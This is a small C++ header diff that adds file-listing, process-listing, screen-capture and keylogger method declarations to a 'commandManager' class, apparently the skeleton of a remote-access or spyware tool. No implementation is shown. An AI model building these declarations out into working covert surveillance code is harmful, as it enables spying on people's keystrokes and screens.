@@ -5,6 +5,9 @@ class commandManager
 
 public:
 	commandManager();
-	void fileListing();
+	void getFilelist(LPCWSTR path);
+	void getProcess();
+	bool getScreen(LPCSTR fname);
+	void keyLogger();
 };
 
